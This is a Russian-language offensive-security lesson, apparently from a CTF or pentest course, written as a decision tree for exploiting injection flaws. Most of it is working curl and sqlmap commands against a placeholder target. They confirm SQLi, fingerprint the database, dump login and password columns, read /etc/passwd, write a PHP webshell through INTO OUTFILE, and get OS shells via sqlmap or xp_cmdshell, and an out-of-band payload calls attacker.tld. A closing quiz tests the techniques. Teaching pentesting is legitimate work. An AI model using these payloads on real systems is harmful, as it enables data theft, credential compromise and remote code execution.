---
id: web-playbook-injection-triage
title: "Плейбук: триаж инъекции — от подозрения до дампа и RCE"
category: web
parent: web-playbooks-recon
difficulty: hard
order: 2
tags: [playbook, sqli, injection, triage, union, blind, oob, decision-tree, web]
prerequisites: [web-sqli, web-playbook-recon-to-foothold, web-tool-sqlmap]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 38
summary: "Decision-tree для возможной инъекции: подтвердить → определить СУБД → выбрать технику (union/error/blind/OOB) → извлечь данные → эскалировать до файлов и RCE."
---

Вы заметили признак инъекции: одиночная кавычка дала ошибку, ответ изменился на `AND 1=1`, страница «зависла» на время. Дальше — самый частый ступор: **это точно SQLi? какая СУБД? какую технику брать? и как из «нашёл» получить дамп или код?** Этот плейбук — дерево решений для всех инъекций (SQL/NoSQL/LDAP/XPath): на каждом узле конкретная команда и условие перехода.

## Дерево решения (общая карта)

```
[признак инъекции]
   │
   ├─(1) CONFIRM: воспроизвести детерминированно (не один раз!)
   │      │
   │      ├─ ошибка СУБД ──────────────► error-based (3)
   │      ├─ ответ изменился на AND 1=1/1=2 ─► boolean (3)
   │      ├─ задержка от SLEEP/pg_sleep ─────► time-based (3)
   │      └─ ничего не видно, но что-то есть ─► OOB (3)
   │
   ├─(2) FINGERPRINT: какая СУБД и какая ОС
   │      │
   │      └─ MySQL / PostgreSQL / MSSQL / Oracle / SQLite ─► профильная ветка
   │
   ├─(3) ТЕХНИКА: union / error / boolean / time / OOB
   │      │
   │      └─ выбрал рабочую ──► (4) извлечение
   │
   ├─(4) EXTRACT: версия → текущая БД → таблицы → колонки → данные
   │
   └─(5) ESCALATE: файл-чтение/запись → RCE
          │
          └─► [данные / код / доступ]
```

## Шаг 1. Confirm: воспроизвести детерминированно

Одна ошибка на один запрос ничего не значит — может быть случайный шум. Нужна **воспроизводимость**.

```bash
# Базовая точка отсчёта
curl -s -o /dev/null -w 'code=%{http_code} size=%{size_download} t=%{time_total}\n' \
  --get --data-urlencode 'id=1' https://target.tld/item

# Пары «истина/ложь» — детерминированное изменение ответа
curl -s -o /dev/null -w 'TRUE  size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=1" https://target.tld/item
curl -s -o /dev/null -w 'FALSE size=%{size_download}\n' --get --data-urlencode "id=1 AND 1=2" https://target.tld/item

# Кавычка/скобки — на ошибку синтаксиса
for p in "'" "\"" "')" "'))" "';" "%27"; do
  curl -s --get --data-urlencode "id=1$p" https://target.tld/item \
    | grep -ioE 'sql syntax|syntax error|ORA-[0-9]+|SQLite|postgres|mysql|unclosed' | head -1
done
```

**Условие ветвления:** если `AND 1=1` и `AND 1=2` дают **стабильно разный** ответ — boolean-инъекция подтверждена. Если кавычка даёт **разную** ошибку синтаксиса — тоже подтверждено. Если разницы нет ни в чём — инъекция не подтверждена, вернитесь к параметр-разведке.

**Важно про контекст:** инъекция в JSON (`{"id":1}`), в cookie, в заголовке, в multipart ведёт себя иначе, чем в query. Сначала определите, где именно вы вставляете значение.

## Шаг 2. Fingerprint: какая СУБД

От СУБД зависит всё: синтаксис, функции задержки, способ чтения файлов и RCE.

```bash
# Ошибка обычно сама называет СУБД — соберите её текст
curl -s --get --data-urlencode "id=1'" https://target.tld/item | grep -iE 'mysql|maria|postgres|mssql|oracle|sqlite|odbc'

# Версия через конкатенацию (MySQL) / || (Postgres/Oracle) / + (MSSQL)
curl -s --get --data-urlencode "id=1 UNION SELECT @@version,2-- -" https://target.tld/item
curl -s --get --data-urlencode "id=1 UNION SELECT version(),2-- -" https://target.tld/item
curl -s --get --data-urlencode "id=1 UNION SELECT @@VERSION,2-- -" https://target.tld/item

# sqlmap сам определит СУБД (безопасный «баннер»-запуск)
sqlmap -u 'https://target.tld/item?id=1' --batch --banner --level 2 --risk 1
```

Таблица признаков:

| Признак в ответе | СУБД | Функция задержки |
|------------------|------|------------------|
| `You have an error in your SQL syntax` | MySQL/MariaDB | `SLEEP(n)` |
| `ERROR: syntax error at or near` | PostgreSQL | `pg_sleep(n)` |
| `Unclosed quotation mark after ...` | MSSQL | `WAITFOR DELAY '0:0:5'` |
| `ORA-01756: quoted string not properly terminated` | Oracle | `dbms_pipe.receive_message` |
| `SQLite3::...` / `near "...": syntax error` | SQLite | тяжёлый запрос / `randomblob` |

**Условие ветвления:** СУБД известна → берите её профильный урок (`db-mysql`, `db-postgresql`, `db-mssql`, `db-oracle`, `db-sqlite`) и технику из шага 3. Неизвестна → `sqlmap --fingerprint`.

## Шаг 3. Техника: union / error / boolean / time / OOB

Выбирайте **по тому, что вы реально видите**, а не по принципу «union круче».

| Техника | Когда брать | Условие успеха | Команда-заготовка |
|---------|-------------|----------------|-------------------|
| **UNION** | ответ выводит данные запроса на страницу | число колонок совпадает | `... UNION SELECT 1,2,3-- -` |
| **Error** | ошибки СУБД видны в ответе | можно заставить ошибку с данными | `extractvalue(1,concat(0x7e,version()))` |
| **Boolean** | ответ «есть/нет», различается по размеру | есть стабильная разница | `... AND substr(database(),1,1)='a'` |
| **Time** | ответ вообще не меняется | задержка воспроизводится | `... AND SLEEP(5)-- -` |
| **OOB** | нет ни данных, ни разницы, ни времени | сервер может слать DNS/HTTP наружу | `load_file('\\\\attacker.tld\\a')` / `UTL_HTTP` |

```bash
# UNION: сначала число колонок через ORDER BY
for n in 1 2 3 4 5 6; do
  curl -s -o /dev/null -w "cols=$n code=%{http_code}\n" \
    --get --data-urlencode "id=1 ORDER BY $n" https://target.tld/item
done
# на первой ошибке (n) — колонок (n-1); затем находим «печатающуюся» колонку
curl -s --get --data-urlencode "id=-1 UNION SELECT 1,2,3-- -" https://target.tld/item

# Error-based (MySQL): версия прямо в ошибке
curl -s --get --data-urlencode "id=1 AND extractvalue(1,concat(0x7e,version()))-- -" https://target.tld/item

# Boolean (побитовое извлечение) — по символу
curl -s --get --data-urlencode "id=1 AND ascii(substr((SELECT database()),1,1))>100-- -" https://target.tld/item

# Time (MySQL) — надёжный признак даже вслепую
time curl -s -o /dev/null --get --data-urlencode "id=1 AND IF(1=1,SLEEP(5),0)-- -" https://target.tld/item
```

**Условие ветвления:** нашли рабочую технику → шаг 4. UNION не сработал (число колонок/тип) → пробуйте error, затем boolean, затем time. Ничего → OOB или признайте, что точка неинъекционна.

## Шаг 4. Extract: от версии к данным

Порядок всегда один: **версия → текущая БД → таблицы → колонки → строки**. Не пытайтесь сразу `--dump-all`.

```bash
# Ручной UNION-дамп (MySQL): все таблицы текущей БД в одну строку
curl -s --get --data-urlencode \
  "id=-1 UNION SELECT group_concat(table_name),2,3 FROM information_schema.tables WHERE table_schema=database()-- -" \
  https://target.tld/item

# Колонки конкретной таблицы
curl -s --get --data-urlencode \
  "id=-1 UNION SELECT group_concat(column_name),2,3 FROM information_schema.columns WHERE table_name='users'-- -" \
  https://target.tld/item

# Строки (логины/хеши)
curl -s --get --data-urlencode \
  "id=-1 UNION SELECT group_concat(login,0x3a,password SEPARATOR 0x0a),2,3 FROM users-- -" \
  https://target.tld/item

# Автоматизация (когда рука устала)
sqlmap -u 'https://target.tld/item?id=1' --batch --dbs
sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb --tables
sqlmap -u 'https://target.tld/item?id=1' --batch -D appdb -T users -C login,password --dump
```

**Условие ветвления:** получили креды → проверьте их на других сервисах и в `web-playbook-auth-bypass`. Получили чувствительные данные → это уже подтверждённая находка (фиксируйте доказательство).

## Шаг 5. Escalate: файлы и RCE

Инъекция в БД — это не только данные. Часто она даёт чтение/запись файлов и код.

```bash
# Чтение файла (MySQL, при FILE-привилегии)
curl -s --get --data-urlencode "id=-1 UNION SELECT load_file('/etc/passwd'),2,3-- -" https://target.tld/item

# Запись webshell (MySQL, нужен FILE + writable webroot + secure_file_priv='')
#   INTO OUTFILE требует, чтобы файл ещё не существовал
curl -s --get --data-urlencode \
  "id=-1 UNION SELECT '<?php system(\$_GET[0]); ?>',2,3 INTO OUTFILE '/var/www/html/s.php'-- -" \
  https://target.tld/item
curl -s 'https://target.tld/s.php?0=id'

# PostgreSQL: COPY ... TO/FROM PROGRAM = прямой RCE
sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell --technique=U

# MSSQL: включить и использовать xp_cmdshell
sqlmap -u 'https://target.tld/item?id=1' --batch --os-shell
```

**Условие ветвления:** `load_file` работает → ищите конфиги с кредами (`/var/www/.env`, `/etc/mysql/my.cnf`). `INTO OUTFILE` работает → webshell → `id`. `--os-shell` работает → стабилизируйте доступ (обратный шелл/туннель), не «стреляйте» по одному запросу многократно.

**Осторожно:** `INTO OUTFILE`, `COPY ... PROGRAM`, `xp_cmdshell`, `--os-shell` **меняют состояние** цели. На продакшене сначала согласуйте; пишите webshell в отдельный файл, не перезаписывайте существующие; не выполняйте деструктивных команд.

## Если не сработало — пробуй это

- **UNION не сходится.** Проверьте число колонок через `ORDER BY`, тип (`NULL` вместо числа/строки), комментарий под СУБД (`-- -` vs `#` vs `/* */`).
- **Фильтр режет кавычку/пробел.** `/**/` вместо пробела, `%0a`, `%09`, `char(39)` вместо `'`, `0x...` вместо строк, регистр (`SeLeCt`), двойное URL-encoding.
- **Boolean «плывёт».** Динамический контент (реклама/время) меняет размер — сравнивайте не полный размер, а наличие конкретного маркера, либо переходите на time-based.
- **Time нестабилен.** Увеличьте `--time-sec`, сделайте несколько замеров, вычтите базовую задержку.
- **Всё вслепую и без OOB.** Попробуйте инъекцию в другие поля (cookie, `User-Agent`, `X-Forwarded-For`, `Referer`) — они часто логируются в БД, которую вы потом читаете.
- **NoSQL/LDAP/XPath.** Признак: JSON-параметр или `filter=(...)`. Пробуйте `{"$ne":null}`, `*)(|(cn=*`, `' or '1'='1` в XPath. Профиль: `web-nosql-injection`, `web-ldap-injection`, `web-xpath-injection`.

## Тупики (dead ends)

- Гонять `sqlmap --dump-all --level 5 --risk 3` с ходу — долго, шумно, часто ломает сессию. Сначала ручное подтверждение и узкий дамп.
- Считать, что «UNION не сработал = нет SQLi». Boolean/time/OOB остаются.
- Игнорировать, что параметр попадает в **другой** контекст (заголовок/логи) — там инъекция может быть, даже если в `id` её нет.
- `INTO OUTFILE` в существующий файл — ошибка, ничего не запишется; и без `secure_file_priv` — тоже.
- Трактовать «задержку» как time-based без контроля: сеть, GC, кэш тоже дают задержку — нужен повтор и контрольная точка.

## Квиз

```quiz
- question: "Ответ на ' AND 1=1 и ' AND 1=2 отличается стабильно. Что это за техника?"
  options:
    - "UNION-based"
    - "Boolean-based blind"
    - "Error-based"
    - "Out-of-band"
  answer: 1
  explanation: "Разница между истинным и ложным условием без вывода данных — это boolean-based blind."
- question: "Какая функция задержки у PostgreSQL?"
  options:
    - "SLEEP(n)"
    - "WAITFOR DELAY"
    - "pg_sleep(n)"
    - "dbms_pipe.receive_message"
  answer: 2
  explanation: "У PostgreSQL задержку даёт pg_sleep; SLEEP — MySQL, WAITFOR — MSSQL."
- question: "Что делают ПЕРЕД UNION-дампом?"
  options:
    - "Сразу --dump-all"
    - "Определяют число колонок (ORDER BY) и печатающуюся колонку"
    - "Меняют User-Agent"
    - "Пишут webshell"
  answer: 1
  explanation: "UNION требует совпадения числа и типов колонок — их определяют заранее."
- question: "UNION не сработал, ошибок нет, размер ответа не меняется. Что дальше?"
  options:
    - "Признать, что инъекции нет"
    - "Попробовать time-based и OOB"
    - "Запустить XSS-сканер"
    - "Сменить браузер"
  answer: 1
  explanation: "Слепые точки раскрываются через time-based или out-of-band каналы."
- question: "Что нужно, чтобы MySQL записал webshell через INTO OUTFILE?"
  options:
    - "Только кавычка"
    - "Привилегия FILE, writable webroot и незанятый файл (secure_file_priv пуст)"
    - "Только UNION"
    - "Только Windows"
  answer: 1
  explanation: "Запись файла требует FILE-привилегии, права писать в webroot и отсутствия файла-цели."
```

## Где пригодится

- **CTF (Web):** быстрый выбор техники и переход к дампу под таймером.
- **Bug bounty:** структурированное подтверждение инъекции без ложных отчётов.
- **Пентест:** от подозрения к данным и RCE с доказательствами на каждом шаге.
- **Работа (AppSec):** понимание, почему параметризованные запросы и минимальные привилегии БД критичны.
